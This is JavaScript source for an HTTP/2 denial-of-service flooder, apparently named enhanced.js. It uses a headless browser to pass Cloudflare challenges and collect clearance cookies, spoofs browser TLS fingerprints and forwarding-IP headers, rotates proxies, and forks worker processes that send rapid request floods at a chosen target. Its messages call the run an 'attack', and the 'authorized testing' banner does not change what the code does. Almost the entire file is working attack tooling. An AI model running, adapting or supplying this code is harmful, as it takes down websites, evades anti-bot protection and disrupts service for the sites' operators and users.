const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

class ProxyManager {
    constructor() {
        this.proxies = [];
        this.currentIndex = 0;
        this.loadProxies();
    }

    loadProxies() {
        try {
            if (fs.existsSync('proxies.txt')) {
                const proxyData = fs.readFileSync('proxies.txt', 'utf8');
                this.proxies = proxyData.split('\n')
                    .map(line => line.trim())
                    .filter(line => line && !line.startsWith('#'));
                console.log(`\x1b[32mLoaded ${this.proxies.length} proxies\x1b[0m`);
            } else {
                console.log('\x1b[33mNo proxies.txt found, using direct connection\x1b[0m');
            }
        } catch (error) {
            console.log('\x1b[31mError loading proxies:', error.message, '\x1b[0m');
        }
    }

    getNextProxy() {
        if (this.proxies.length === 0) return null;
        
        const proxy = this.proxies[this.currentIndex];
        this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
        return proxy;
    }

    getProxyCount() {
        return this.proxies.length;
    }
}

const proxyManager = new ProxyManager();

function flood(userAgent, cookie, proxy = null) {
    let client = null;
    let tlsSocket = null;
    let active = true;

    const executeFlood = () => {
        try {
            let parsed = url.parse(args.target);
            let path = parsed.path;

            function randomDelay(min, max) {
                return Math.floor(Math.random() * (max - min + 1)) + min;
            }
            
            let interval = randomDelay(100, 1000);

            function getChromeVersion(userAgent) {
                const chromeVersionRegex = /Chrome\/([\d.]+)/;
                const match = userAgent.match(chromeVersionRegex);
                return match && match[1] ? match[1] : "126";
            }

            const chromever = getChromeVersion(userAgent);
            const randValue = list => list[Math.floor(Math.random() * list.length)];
            
            const lang_header1 = [
                "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", 
                "es-ES,es;q=0.9", "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9",
                "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9", "ru-RU,ru;q=0.9"
            ];

            let fixed = {
                ":method": "GET",
                ":authority": parsed.host,
                ":scheme": "https",
                ":path": path,
                "user-agent": userAgent,
                "upgrade-insecure-requests": "1",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "cookie": cookie,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "Chrome";v="${chromever}"`,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": randValue(lang_header1),
                "priority": "u=0, i",
                "te": "trailers"
            };

            const randomHeaders = {
                ...(Math.random() < 0.3 ? { "x-forwarded-for": generateRandomIP() } : {}),
                ...(Math.random() < 0.3 ? { "x-real-ip": generateRandomIP() } : {}),
                ...(Math.random() < 0.2 ? { "cf-connecting-ip": generateRandomIP() } : {}),
                ...(Math.random() < 0.4 ? { "purpure-secretf-id": "formula-" + generateRandomString(2, 4) } : {})
            };

            const headers = { ...fixed, ...randomHeaders };

            function createCustomTLSSocket(parsed, proxy) {
                const socketOptions = {
                    host: parsed.host,
                    port: 443,
                    servername: parsed.host,
                    minVersion: "TLSv1.2",
                    maxVersion: "TLSv1.3",
                    ALPNProtocols: ["h2"],
                    rejectUnauthorized: false,
                    sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
                    ecdhCurve: "X25519:P-256:P-384"
                };

                if (proxy) {
                    const [proxyHost, proxyPort] = proxy.split(':');
                    socketOptions.socket = require('net').connect(proxyPort || 8080, proxyHost);
                }

                const tlsSocket = tls.connect(socketOptions);
                tlsSocket.setKeepAlive(true, 60000);
                tlsSocket.setTimeout(30000);
                
                return tlsSocket;
            }

            tlsSocket = createCustomTLSSocket(parsed, proxy);
            
            client = http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    enablePush: false,
                    initialWindowSize: 6291456,
                    maxConcurrentStreams: 100
                }
            });

            client.on("connect", () => {
                let requestCount = 0;
                const maxRequestsPerConnection = 100 + Math.floor(Math.random() * 50);
                
                const sendRequests = () => {
                    if (!active || requestCount > maxRequestsPerConnection) {
                        restartConnection();
                        return;
                    }

                    for (let i = 0; i < args.Rate; i++) {
                        if (!active) break;
                        
                        try {
                            const request = client.request(headers);
                            requestCount++;

                            request.on("response", (res) => {
                                global.successRequests = (global.successRequests || 0) + 1;
                                global.totalRequests = (global.totalRequests || 0) + 1;
                                
                                if (res[":status"] === 429 || res[":status"] === 503) {
                                    active = false;
                                    setTimeout(() => {
                                        flood(userAgent, cookie, proxyManager.getNextProxy());
                                    }, 2000);
                                }
                            });

                            request.on("error", () => {
                                global.failedRequests = (global.failedRequests || 0) + 1;
                            });

                            request.end();
                        } catch (err) {
                            global.failedRequests = (global.failedRequests || 0) + 1;
                        }
                    }

                    if (active) {
                        setTimeout(sendRequests, interval);
                    }
                };

                sendRequests();
            });

            client.on("goaway", (errorCode, lastStreamID) => {
                if (active) {
                    restartConnection();
                }
            });

            client.on("close", () => {
                if (active) {
                    restartConnection();
                }
            });

            client.on("error", (error) => {
                global.failedRequests = (global.failedRequests || 0) + 1;
                if (active) {
                    restartConnection();
                }
            });

            tlsSocket.on("error", (error) => {
                if (active) {
                    restartConnection();
                }
            });

        } catch (err) {
            global.failedRequests = (global.failedRequests || 0) + 1;
            if (active) {
                setTimeout(() => flood(userAgent, cookie, proxyManager.getNextProxy()), 1000);
            }
        }
    };

    const restartConnection = () => {
        active = false;
        try {
            if (client) client.destroy();
            if (tlsSocket) tlsSocket.destroy();
        } catch (e) {}
        
        setTimeout(() => {
            flood(userAgent, cookie, proxyManager.getNextProxy());
        }, Math.random() * 2000 + 500);
    };

    executeFlood();
}

async function bypassCloudflareOnce(attemptNum = 1, proxy = null) {
    let browser = null;
    let page = null;
    
    try {
        console.log(`\x1b[33mBypass attempt ${attemptNum} ${proxy ? 'with proxy ' + proxy : ''}...\x1b[0m`);
        
        const connectOptions = {
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--window-size=1920,1080',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process'
            ],
            turnstile: true
        };

        if (proxy) {
            connectOptions.args.push(`--proxy-server=${proxy}`);
        }

        const response = await connect(connectOptions);
        browser = response.browser;
        page = response.page;

        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        });

        await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        
        console.log(`\x1b[33mNavigating to target...\x1b[0m`);
        
        try {
            await page.goto(args.target, { 
                waitUntil: 'networkidle2',
                timeout: 45000 
            });
        } catch (navError) {
            console.log(`\x1b[33mNavigation warning: ${navError.message}\x1b[0m`);
        }

        let challengeSolved = false;
        let checks = 0;
        const maxChecks = 90; 
        
        while (!challengeSolved && checks < maxChecks) {
            await new Promise(r => setTimeout(r, 500));
            checks++;

            try {
                const cookies = await page.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                
                if (cfClearance) {
                    console.log(`\x1b[32mCloudflare bypassed after ${(checks * 0.5).toFixed(1)}s!\x1b[0m`);
                    challengeSolved = true;
                    
                    const userAgent = await page.evaluate(() => navigator.userAgent);
                    
                    await page.close();
                    await browser.close();
                    
                    return {
                        cookies: cookies,
                        userAgent: userAgent,
                        cfClearance: cfClearance.value,
                        success: true,
                        proxy: proxy,
                        attemptNum: attemptNum
                    };
                }

                const isChallenge = await page.evaluate(() => {
                    return document.title.includes('Just a moment') || 
                           document.body.innerHTML.includes('Checking your browser') ||
                           document.body.innerHTML.includes('cloudflare');
                });

                if (!isChallenge && checks > 5) {
                    challengeSolved = true; 
                }

            } catch (e) {
            }
        }

        const cookies = await page.cookies();
        const userAgent = await page.evaluate(() => navigator.userAgent);
        
        await page.close();
        await browser.close();

        return {
            cookies: cookies,
            userAgent: userAgent,
            cfClearance: null,
            success: false,
            proxy: proxy,
            attemptNum: attemptNum
        };

    } catch (error) {
        console.log(`\x1b[31mBypass attempt ${attemptNum} failed: ${error.message}\x1b[0m`);
        
        try {
            if (page) await page.close();
            if (browser) await browser.close();
        } catch (e) {}
        
        return {
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            cfClearance: null,
            success: false,
            proxy: proxy,
            attemptNum: attemptNum
        };
    }
}

async function bypassCloudflareEnhanced(totalCount) {
    console.log("\x1b[35mENHANCED CLOUDFLARE BYPASS WITH PROXY SUPPORT\x1b[0m");
    
    const results = [];
    let attemptCount = 0;
    const proxies = proxyManager.getProxyCount() > 0 ? 
        [...proxyManager.proxies].sort(() => Math.random() - 0.5) : 
        [null]; 

    while (results.length < totalCount && attemptCount < totalCount * 3) {
        const currentBatchSize = Math.min(2, totalCount - results.length);
        const batchPromises = [];

        for (let i = 0; i < currentBatchSize; i++) {
            attemptCount++;
            const proxy = proxies[attemptCount % proxies.length];
            batchPromises.push(bypassCloudflareOnce(attemptCount, proxy));
        }

        const batchResults = await Promise.allSettled(batchPromises);
        
        for (const result of batchResults) {
            if (result.status === 'fulfilled' && result.value.success) {
                results.push(result.value);
                console.log(`\x1b[32m✓ Session ${result.value.attemptNum} successful! (${results.length}/${totalCount})\x1b[0m`);
            }
        }

        if (results.length < totalCount) {
            const delay = 1000 + Math.random() * 2000;
            await new Promise(r => setTimeout(r, delay));
        }
    }

    if (results.length === 0) {
        console.log("\x1b[33mNo Cloudflare sessions obtained, using fallback\x1b[0m");
        results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            cfClearance: null,
            success: true
        });
    }

    return results;
}

function generateRandomString(min, max) {
    const length = Math.floor(Math.random() * (max - min + 1)) + min;
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({length}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function runEnhancedFlooder() {
    const session = randomElement(global.bypassData || []);
    if (!session) return;

    const cookieString = session.cookies ? session.cookies.map(c => `${c.name}=${c.value}`).join("; ") : "";
    const userAgent = session.userAgent;
    const proxy = proxyManager.getNextProxy();

    flood(userAgent, cookieString, proxy);
}

function displayEnhancedStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    console.clear();
    console.log("\x1b[35m⚡ ENHANCED LOAD TESTER WITH PROXY SUPPORT ⚡\x1b[0m");
    console.log(`\x1b[36mTarget:\x1b[0m ${args.target}`);
    console.log(`\x1b[36mTime:\x1b[0m ${elapsed}s / ${args.time}s (${remaining}s remaining)`);
    console.log(`\x1b[36mConfig:\x1b[0m Rate: ${args.Rate}/s | Threads: ${args.threads} | Proxies: ${proxyManager.getProxyCount()}`);
    console.log(`\x1b[36mSessions:\x1b[0m ${global.bypassData ? global.bypassData.length : 0}/${args.cookieCount}`);
    console.log("\x1b[33mStatistics:\x1b[0m");
    console.log(`   \x1b[32mSuccess:\x1b[0m ${global.successRequests || 0}`);
    console.log(`   \x1b[31mFailed:\x1b[0m ${global.failedRequests || 0}`);
    console.log(`   \x1b[36mTotal:\x1b[0m ${global.totalRequests || 0}`);
    
    const reqPerSec = elapsed > 0 ? ((global.totalRequests || 0) / elapsed).toFixed(2) : 0;
    console.log(`   \x1b[33mSpeed:\x1b[0m ${reqPerSec} req/s`);
    
    const successRate = global.totalRequests > 0 ? 
        ((global.successRequests || 0) / global.totalRequests * 100).toFixed(2) : 0;
    console.log(`   \x1b[32mSuccess Rate:\x1b[0m ${successRate}%`);
    
    if (remaining > 0) {
        const progress = Math.floor((elapsed / args.time) * 20);
        console.log(`\n\x1b[36mProgress: [${'█'.repeat(progress)}${'░'.repeat(20-progress)}] ${Math.floor((elapsed/args.time)*100)}%\x1b[0m`);
    }
}

if (process.argv.length < 6) {
    console.log("\x1b[31mUsage: node enhanced.js <target> <time> <rate> <threads> <sessions>\x1b[0m");
    console.log("\x1b[33mExample: node enhanced.js https://example.com 60 5 4 6\x1b[0m");
    console.log("\x1b[36mProxies: Add proxies to proxies.txt (one per line)\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 4
};

global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

if (cluster.isPrimary) {
    console.clear();
    console.log("\x1b[35m⚡ ENHANCED LOAD TESTER ⚡\x1b[0m");
    console.log("\x1b[33mONLY FOR AUTHORIZED TESTING!\x1b[0m\n");
    
    (async () => {
        const sessions = await bypassCloudflareEnhanced(args.cookieCount);
        global.bypassData = sessions;
        
        console.log(`\n\x1b[32m✓ Obtained ${sessions.length} sessions, starting attack...\x1b[0m`);
        global.startTime = Date.now();

        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ type: 'sessions', data: sessions });
        }
        
        const statsInterval = setInterval(displayEnhancedStats, 1000);

        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
            }
        });
        
        cluster.on('exit', (worker, code, signal) => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const newWorker = cluster.fork();
                newWorker.send({ type: 'sessions', data: sessions });
            }
        });

        const restartInterval = setInterval(() => {
            if (Date.now() - global.startTime < args.time * 1000) {
                sessions.forEach(session => {
                    if (Math.random() < 0.3) { 
                        bypassCloudflareOnce(999, session.proxy).then(newSession => {
                            if (newSession.success) {
                                const index = sessions.findIndex(s => s.attemptNum === session.attemptNum);
                                if (index !== -1) {
                                    sessions[index] = newSession;
                                }
                            }
                        });
                    }
                });
            }
        }, 30000);
        
        setTimeout(() => {
            clearInterval(statsInterval);
            clearInterval(restartInterval);
            displayEnhancedStats();
            console.log("\n\x1b[32m🎯 Attack completed!\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
        
    })();
    
} else {
    let workerSessions = [];
    
    process.on('message', (msg) => {
        if (msg.type === 'sessions') {
            workerSessions = msg.data;
            
            const attackInterval = setInterval(() => {
                for (let i = 0; i < 8; i++) {
                    runEnhancedFlooder();
                }
            }, 50);
            
            setInterval(() => {
                process.send({
                    type: 'stats',
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0
                });

                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
            
            setTimeout(() => {
                clearInterval(attackInterval);
                process.exit(0);
            }, args.time * 1000);
        }
    });
}

process.on('uncaughtException', (err) => {

});

process.on('unhandledRejection', (err) => {

});
